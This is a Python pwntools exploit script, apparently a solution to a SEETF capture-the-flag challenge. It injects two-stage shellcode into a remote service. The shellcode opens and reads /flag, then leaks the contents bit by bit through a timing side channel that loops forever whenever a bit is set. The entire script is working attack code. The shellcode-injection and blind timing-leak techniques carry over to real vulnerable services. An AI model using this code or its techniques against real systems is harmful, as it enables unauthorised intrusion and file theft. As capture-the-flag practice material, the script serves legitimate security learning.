from pwn import *
import time
context.arch = 'amd64'
shellcode = b"\x31\xFF\x89\xD6\x0F\x05"
offset = 11
flag = "SEE{n1c3_sh"
while flag=="" or flag[-1]!="}":
    bit = ""
    for bit_offset in range(8):
        # io = process('./chall')
        io = remote('win.the.seetf.sg',2002)
        io.recv()
        # gdb.attach(io)
        io.send(shellcode)

        doing = shellcraft.amd64.open('/flag')
        doing += shellcraft.amd64.read('rax','rsp',0x100)
        doing +=f"""
            xor r11,r11
            xor rax, rax
            mov al, [rsp+{offset}]
            shr al, {bit_offset}
            and al, 1
        loop:
            cmp rax, r11
            je end
            jmp loop
        end:
        """
        # print(doing)
        doing = b'\x90'*6 + asm(doing)
        io.send(doing)
        # io.interactive()
        tmout = 3
        alpha = time.time()
        io.recvall(timeout=tmout)
        print(time.time()- alpha)
        if (time.time() - alpha > tmout):
            bit +="1"
        else:
            bit +="0"
        io.close()
    flag+=chr(int(bit[::-1],2))
    print(flag)
    offset+=1
